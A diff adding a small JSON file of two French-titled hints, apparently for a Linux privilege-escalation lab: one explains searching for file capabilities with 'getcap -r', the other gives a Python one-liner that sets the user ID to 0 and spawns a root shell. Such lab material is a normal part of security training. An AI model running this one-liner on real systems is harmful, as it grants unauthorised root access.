@@ -1,0 +1,10 @@
+[
+  {
+    "title": "Commande getcap",
+    "content": "L'argument -r permet une recherche récursive, et 2>/dev/null masque les erreurs de permission."
+  },
+  {
+    "title": "One-liner Python",
+    "content": "python3 -c \"import os; os.setuid(0); os.system('/bin/sh')\""
+  }
+]
